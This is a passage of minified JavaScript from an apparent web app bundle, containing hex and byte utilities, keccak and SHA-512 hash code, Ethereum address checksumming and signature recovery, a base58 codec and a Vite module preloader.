eE({size:t.length,targetSize:r,type:"bytes"});const n=new Uint8Array(r);for(let i=0;i<r;i++){const s=e==="right";n[s?i:r-i-1]=t[s?i:t.length-i-1]}return n}class qI extends mc{constructor({max:e,min:r,signed:n,size:i,value:s}){super(`Number "${s}" is not in safe ${i?`${i*8}-bit ${n?"signed":"unsigned"} `:""}integer range ${e?`(${r} to ${e})`:`(above ${r})`}`,{name:"IntegerOutOfRangeError"})}}class VI extends mc{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed ${r} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}}function ah(t,{size:e}){if(vv(t)>e)throw new VI({givenSize:vv(t),maxSize:e})}function zm(t,e={}){const{signed:r}=e;e.size&&ah(t,{size:e.size});const n=BigInt(t);if(!r)return n;const i=(t.length-2)/2,s=(1n<<BigInt(i)*8n-1n)-1n;return n<=s?n:n-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function WI(t,e={}){return Number(zm(t,e))}const GI=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function jm(t,e={}){return typeof t=="number"||typeof t=="bigint"?rE(t,e):typeof t=="string"?JI(t,e):typeof t=="boolean"?KI(t,e):tE(t,e)}function KI(t,e={}){const r=`0x${Number(t)}`;return typeof e.size=="number"?(ah(r,{size:e.size}),oh(r,{size:e.size})):r}function tE(t,e={}){let r="";for(let i=0;i<t.length;i++)r+=GI[t[i]];const n=`0x${r}`;return typeof e.size=="number"?(ah(n,{size:e.size}),oh(n,{dir:"right",size:e.size})):n}function rE(t,e={}){const{signed:r,size:n}=e,i=BigInt(t);let s;n?r?s=(1n<<BigInt(n)*8n-1n)-1n:s=2n**(BigInt(n)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&r?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new qI({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:r,size:n,value:`${t}${c}`})}const a=`0x${(r&&i<0?(1n<<BigInt(n*8))+BigInt(i):i).toString(16)}`;return n?oh(a,{size:n}):a}const ZI=new TextEncoder;function JI(t,e={}){const r=ZI.encode(t);return tE(r,e)}const QI=new TextEncoder;function YI(t,e={}){return typeof t=="number"||typeof t=="bigint"?eS(t,e):typeof t=="boolean"?XI(t,e):$d(t)?nE(t,e):iE(t,e)}function XI(t,e={}){const r=new Uint8Array(1);return r[0]=Number(t),typeof e.size=="number"?(ah(r,{size:e.size}),oh(r,{size:e.size})):r}const Zi={zero:48,nine:57,A:65,F:70,a:97,f:102};function Ev(t){if(t>=Zi.zero&&t<=Zi.nine)return t-Zi.zero;if(t>=Zi.A&&t<=Zi.F)return t-(Zi.A-10);if(t>=Zi.a&&t<=Zi.f)return t-(Zi.a-10)}function nE(t,e={}){let r=t;e.size&&(ah(r,{size:e.size}),r=oh(r,{dir:"right",size:e.size}));let n=r.slice(2);n.length%2&&(n=`0${n}`);const i=n.length/2,s=new Uint8Array(i);for(let o=0,a=0;o<i;o++){const c=Ev(n.charCodeAt(a++)),l=Ev(n.charCodeAt(a++));if(c===void 0||l===void 0)throw new mc(`Invalid byte sequence ("${n[a-2]}${n[a-1]}" in "${n}").`);s[o]=c*16+l}return s}function eS(t,e){const r=rE(t,e);return nE(r)}function iE(t,e={}){const r=QI.encode(t);return typeof e.size=="number"?(ah(r,{size:e.size}),oh(r,{dir:"right",size:e.size})):r}function K0(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function tS(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Mg(t,...e){if(!tS(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function ene(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");K0(t.outputLen),K0(t.blockLen)}function Cv(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function rS(t,e){Mg(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const fp=BigInt(2**32-1),Av=BigInt(32);function nS(t,e=!1){return e?{h:Number(t&fp),l:Number(t>>Av&fp)}:{h:Number(t>>Av&fp)|0,l:Number(t&fp)|0}}function iS(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=nS(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const sS=(t,e,r)=>t<<r|e>>>32-r,oS=(t,e,r)=>e<<r|t>>>32-r,aS=(t,e,r)=>e<<r-32|t>>>64-r,cS=(t,e,r)=>t<<r-32|e>>>64-r,jc=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function lS(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function tne(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function rne(t,e){return t<<32-e|t>>>e}const xv=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function uS(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function Iv(t){for(let e=0;e<t.length;e++)t[e]=uS(t[e])}function hS(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function sE(t){return typeof t=="string"&&(t=hS(t)),Mg(t),t}function nne(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];Mg(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}let dS=class{clone(){return this._cloneInto()}};function fS(t){const e=n=>t().update(sE(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function sne(t=32){if(jc&&typeof jc.getRandomValues=="function")return jc.getRandomValues(new Uint8Array(t));if(jc&&typeof jc.randomBytes=="function")return jc.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const oE=[],aE=[],cE=[],pS=BigInt(0),Ch=BigInt(1),gS=BigInt(2),wS=BigInt(7),mS=BigInt(256),yS=BigInt(113);for(let t=0,e=Ch,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],oE.push(2*(5*n+r)),aE.push((t+1)*(t+2)/2%64);let i=pS;for(let s=0;s<7;s++)e=(e<<Ch^(e>>wS)*yS)%mS,e&gS&&(i^=Ch<<(Ch<<BigInt(s))-Ch);cE.push(i)}const[bS,vS]=iS(cE,!0),Sv=(t,e,r)=>r>32?aS(t,e,r):sS(t,e,r),Nv=(t,e,r)=>r>32?cS(t,e,r):oS(t,e,r);function ES(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=r[c],u=r[c+1],h=Sv(l,u,1)^r[a],d=Nv(l,u,1)^r[a+1];for(let f=0;f<50;f+=10)t[o+f]^=h,t[o+f+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=aE[o],c=Sv(i,s,a),l=Nv(i,s,a),u=oE[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=bS[n],t[1]^=vS[n]}r.fill(0)}let CS=class lE extends dS{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,K0(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=lS(this.state)}keccak(){xv||Iv(this.state32),ES(this.state32,this.rounds),xv||Iv(this.state32),this.posOut=0,this.pos=0}update(e){Cv(this);const{blockLen:r,state:n}=this;e=sE(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Cv(this,!1),Mg(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return K0(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(rS(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new lE(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const AS=(t,e,r)=>fS(()=>new CS(e,t,r)),xS=AS(1,136,256/8);function uE(t,e){const r=e||"hex",n=xS($d(t,{strict:!1})?YI(t):t);return r==="bytes"?n:jm(n)}class IS extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const r=super.get(e);return super.has(e)&&r!==void 0&&(this.delete(e),super.set(e,r)),r}set(e,r){if(super.set(e,r),this.maxSize&&this.size>this.maxSize){const n=this.keys().next().value;n&&this.delete(n)}return this}}const U1=new IS(8192);function SS(t,e){if(U1.has(`${t}.${e}`))return U1.get(`${t}.${e}`);const r=t.substring(2).toLowerCase(),n=uE(iE(r),"bytes"),i=r.split("");for(let o=0;o<40;o+=2)n[o>>1]>>4>=8&&i[o]&&(i[o]=i[o].toUpperCase()),(n[o>>1]&15)>=8&&i[o+1]&&(i[o+1]=i[o+1].toUpperCase());const s=`0x${i.join("")}`;return U1.set(`${t}.${e}`,s),s}function NS(t){const e=uE(`0x${t.substring(4)}`).substring(26);return SS(`0x${e}`)}const PS="modulepreload",kS=function(t,e){return new URL(t,e).href},Pv={},OS=function(e,r,n){let i=Promise.resolve();if(r&&r.length>0){let o=function(u){return Promise.all(u.map(h=>Promise.resolve(h).then(d=>({status:"fulfilled",value:d}),d=>({status:"rejected",reason:d}))))};const a=document.getElementsByTagName("link"),c=document.querySelector("meta[property=csp-nonce]"),l=(c==null?void 0:c.nonce)||(c==null?void 0:c.getAttribute("nonce"));i=o(r.map(u=>{if(u=kS(u,n),u in Pv)return;Pv[u]=!0;const h=u.endsWith(".css"),d=h?'[rel="stylesheet"]':"";if(!!n)for(let p=a.length-1;p>=0;p--){const w=a[p];if(w.href===u&&(!h||w.rel==="stylesheet"))return}else if(document.querySelector(`link[href="${u}"]${d}`))return;const g=document.createElement("link");if(g.rel=h?"stylesheet":PS,h||(g.as="script"),g.crossOrigin="",g.href=u,l&&g.setAttribute("nonce",l),document.head.appendChild(g),h)return new Promise((p,w)=>{g.addEventListener("load",p),g.addEventListener("error",()=>w(new Error(`Unable to preload CSS for ${u}`)))})}))}function s(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return i.then(o=>{for(const a of o||[])a.status==="rejected"&&s(a.reason);return e().catch(s)})};async function _S({hash:t,signature:e}){const r=$d(t)?t:jm(t),{secp256k1:n}=await OS(async()=>{const{secp256k1:o}=await import("./secp256k1-BysUfCGT.js");return{secp256k1:o}},[],import.meta.url);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:l,s:u,v:h,yParity:d}=e,f=Number(d??h),g=kv(f);return new n.Signature(zm(l),zm(u)).addRecoveryBit(g)}const o=$d(e)?e:jm(e),a=WI(`0x${o.slice(130)}`),c=kv(a);return n.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(r.substring(2)).toHex(!1)}`}function kv(t){if(t===0||t===1)return t;if(t===27)return 0;if(t===28)return 1;throw new Error("Invalid yParityOrV value")}async function TS({hash:t,signature:e}){return NS(await _S({hash:t,signature:e}))}function $S(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let l=0;l<e.length;l++)e[l]=255;for(let l=0;l<t.length;l++){const u=t.charAt(l),h=u.charCodeAt(0);if(e[h]!==255)throw new TypeError(u+" is ambiguous");e[h]=l}const r=t.length,n=t.charAt(0),i=Math.log(r)/Math.log(256),s=Math.log(256)/Math.log(r);function o(l){if(l instanceof Uint8Array||(ArrayBuffer.isView(l)?l=new Uint8Array(l.buffer,l.byteOffset,l.byteLength):Array.isArray(l)&&(l=Uint8Array.from(l))),!(l instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(l.length===0)return"";let u=0,h=0,d=0;const f=l.length;for(;d!==f&&l[d]===0;)d++,u++;const g=(f-d)*s+1>>>0,p=new Uint8Array(g);for(;d!==f;){let b=l[d],v=0;for(let x=g-1;(b!==0||v<h)&&x!==-1;x--,v++)b+=256*p[x]>>>0,p[x]=b%r>>>0,b=b/r>>>0;if(b!==0)throw new Error("Non-zero carry");h=v,d++}let w=g-h;for(;w!==g&&p[w]===0;)w++;let m=n.repeat(u);for(;w<g;++w)m+=t.charAt(p[w]);return m}function a(l){if(typeof l!="string")throw new TypeError("Expected String");if(l.length===0)return new Uint8Array;let u=0,h=0,d=0;for(;l[u]===n;)h++,u++;const f=(l.length-u)*i+1>>>0,g=new Uint8Array(f);for(;u<l.length;){const b=l.charCodeAt(u);if(b>255)return;let v=e[b];if(v===255)return;let x=0;for(let I=f-1;(v!==0||x<d)&&I!==-1;I--,x++)v+=r*g[I]>>>0,g[I]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");d=x,u++}let p=f-d;for(;p!==f&&g[p]===0;)p++;const w=new Uint8Array(h+(f-p));let m=h;for(;p!==f;)w[m++]=g[p++];return w}function c(l){const u=a(l);if(u)return u;throw new Error("Non-base"+r+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var RS="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const DS=$S(RS),BS=t=>JSON.stringify(t,(e,r)=>typeof r=="bigint"?r.toString()+"n":r),LS=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,r=t.replace(e,'$1"$2n"$3');return JSON.parse(r,(n,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function yc(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return LS(t)}catch{return t}}function js(t){return typeof t=="string"?t:BS(t)||""}function US(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function hE(t,...e){if(!US(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function Ov(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function MS(t,e){hE(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Hc=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const M1=t=>new DataView(t.buffer,t.byteOffset,t.byteLength);function FS(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function dE(t){return typeof t=="string"&&(t=FS(t)),hE(t),t}let zS=class{clone(){return this._cloneInto()}};function jS(t){const e=n=>t().update(dE(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function fE(t=32){if(Hc&&typeof Hc.getRandomValues=="function")return Hc.getRandomValues(new Uint8Array(t));if(Hc&&typeof Hc.randomBytes=="function")return Hc.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}function HS(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,l=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+l,a,n)}let qS=class extends zS{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=M1(this.buffer)}update(e){Ov(this);const{view:r,buffer:n,blockLen:i}=this;e=dE(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=M1(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Ov(this),MS(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;HS(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=M1(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}};const pp=BigInt(2**32-1),Hm=BigInt(32);function pE(t,e=!1){return e?{h:Number(t&pp),l:Number(t>>Hm&pp)}:{h:Number(t>>Hm&pp)|0,l:Number(t&pp)|0}}function VS(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=pE(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const WS=(t,e)=>BigInt(t>>>0)<<Hm|BigInt(e>>>0),GS=(t,e,r)=>t>>>r,KS=(t,e,r)=>t<<32-r|e>>>r,ZS=(t,e,r)=>t>>>r|e<<32-r,JS=(t,e,r)=>t<<32-r|e>>>r,QS=(t,e,r)=>t<<64-r|e>>>r-32,YS=(t,e,r)=>t>>>r-32|e<<64-r,XS=(t,e)=>e,eN=(t,e)=>t,tN=(t,e,r)=>t<<r|e>>>32-r,rN=(t,e,r)=>e<<r|t>>>32-r,nN=(t,e,r)=>e<<r-32|t>>>64-r,iN=(t,e,r)=>t<<r-32|e>>>64-r;function sN(t,e,r,n){const i=(e>>>0)+(n>>>0);return{h:t+r+(i/2**32|0)|0,l:i|0}}const oN=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0),aN=(t,e,r,n)=>e+r+n+(t/2**32|0)|0,cN=(t,e,r,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0),lN=(t,e,r,n,i)=>e+r+n+i+(t/2**32|0)|0,uN=(t,e,r,n,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0)+(i>>>0),hN=(t,e,r,n,i,s)=>e+r+n+i+s+(t/2**32|0)|0,Te={fromBig:pE,split:VS,toBig:WS,shrSH:GS,shrSL:KS,rotrSH:ZS,rotrSL:JS,rotrBH:QS,rotrBL:YS,rotr32H:XS,rotr32L:eN,rotlSH:tN,rotlSL:rN,rotlBH:nN,rotlBL:iN,add:sN,add3L:oN,add3H:aN,add4L:cN,add4H:lN,add5H:hN,add5L:uN},[dN,fN]=Te.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),Ws=new Uint32Array(80),Gs=new Uint32Array(80);let pN=class extends qS{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:r,Bh:n,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:h,Fl:d,Gh:f,Gl:g,Hh:p,Hl:w}=this;return[e,r,n,i,s,o,a,c,l,u,h,d,f,g,p,w]}set(e,r,n,i,s,o,a,c,l,u,h,d,f,g,p,w){this.Ah=e|0,this.Al=r|0,this.Bh=n|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=h|0,this.Fl=d|0,this.Gh=f|0,this.Gl=g|0,this.Hh=p|0,this.Hl=w|0}process(e,r){for(let v=0;v<16;v++,r+=4)Ws[v]=e.getUint32(r),Gs[v]=e.getUint32(r+=4);for(let v=16;v<80;v++){const x=Ws[v-15]|0,I=Gs[v-15]|0,C=Te.rotrSH(x,I,1)^Te.rotrSH(x,I,8)^Te.shrSH(x,I,7),N=Te.rotrSL(x,I,1)^Te.rotrSL(x,I,8)^Te.shrSL(x,I,7),S=Ws[v-2]|0,P=Gs[v-2]|0,T=Te.rotrSH(S,P,19)^Te.rotrBH(S,P,61)^Te.shrSH(S,P,6),D=Te.rotrSL(S,P,19)^Te.rotrBL(S,P,61)^Te.shrSL(S,P,6),z=Te.add4L(N,D,Gs[v-7],Gs[v-16]),V=Te.add4H(z,C,T,Ws[v-7],Ws[v-16]);Ws[v]=V|0,Gs[v]=z|0}let{Ah:n,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:h,El:d,Fh:f,Fl:g,Gh:p,Gl:w,Hh:m,Hl:b}=this;for(let v=0;v<80;v++){const x=Te.rotrSH(h,d,14)^Te.rotrSH(h,d,18)^Te.rotrBH(h,d,41),I=Te.rotrSL(h,d,14)^Te.rotrSL(h,d,18)^Te.rotrBL(h,d,41),C=h&f^~h&p,N=d&g^~d&w,S=Te.add5L(b,I,N,fN[v],Gs[v]),P=Te.add5H(S,m,x,C,dN[v],Ws[v]),T=S|0,D=Te.rotrSH(n,i,28)^Te.rotrBH(n,i,34)^Te.rotrBH(n,i,39),z=Te.rotrSL(n,i,28)^Te.rotrBL(n,i,34)^Te.rotrBL(n,i,39),V=n&s^n&a^s&a,O=i&o^i&c^o&c;m=p|0,b=w|0,p=f|0,w=g|0,f=h|0,g=d|0,{h,l:d}=Te.add(l|0,u|0,P|0,T|0),l=a|0,u=c|0,a=s|0,c=o|0,s=n|0,o=i|0;const y=Te.add3L(T,z,O);n=Te.add3H(y,P,D,V),i=y|0}({h:n,l:i}=Te.add(this.Ah|0,this.Al|0,n|0,i|0)),{h:s,l:o}=Te.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=Te.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=Te.add(this.Dh|0,this.Dl|0,l|0,u|0),{h,l:d}=Te.add(this.Eh|0,this.El|0,h|0,d|0),{h:f,l:g}=Te.add(this.Fh|0,this.Fl|0,f|0,g|0),{h:p,l:w}=Te.add(this.Gh|0,this.Gl|0,p|0,w|0),{h:m,l:b}=Te.add(this.Hh|0,this.Hl|0,m|0,b|0),this.set(n,i,s,o,a,c,l,u,h,d,f,g,p,w,m,b)}roundClean(){Ws.fill(0),Gs.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const gN=jS(()=>new pN);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const $b=BigInt(0),gE=BigInt(1),wN=BigInt(2);function Rb(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Db(t){if(!Rb(t))throw new Error("Uint8Array expected")}function F1(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const mN=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Bb(t){Db(t);let e="";for(let r=0;r<t.length;r++)e+=mN[t[r]];return e}function wE(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?$b:BigInt("0x"+t)}const Ji={_0:48,_9:57,A:65,F:70,a:97,f:102};function _v(t){if(t>=Ji._0&&t<=Ji._9)return t-Ji._0;if(t>=Ji.A&&t<=Ji.F)return t-(Ji.A-10);if(t>=Ji.a&&t<=Ji.f)return t-(Ji.a-10)}function mE(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let i=0,s=0;i<r;i++,s+=2){const o=_v(t.charCodeAt(s)),a=_v(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}n[i]=o*16+a}return n}function yN(t){return wE(Bb(t))}function P0(t){return Db(t),wE(Bb(Uint8Array.from(t).reverse()))}function yE(t,e){return mE(t.toString(16).padStart(e*2,"0"))}function qm(t,e){return yE(t,e).reverse()}function Qi(t,e,r){let n;if(typeof e=="string")try{n=mE(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Rb(e))n=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function Tv(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];Db(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}const z1=t=>typeof t=="bigint"&&$b<=t;function bN(t,e,r){return z1(t)&&z1(e)&&z1(r)&&e<=t&&t<r}function Ah(t,e,r,n){if(!bN(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function vN(t){let e;for(e=0;t>$b;t>>=gE,e+=1);return e}const EN=t=>(wN<<BigInt(t-1))-gE,CN={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||Rb(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Lb(t,e,r={}){const n=(i,s,o)=>{const a=CN[s];if(typeof a!="function")throw new Error("invalid validator 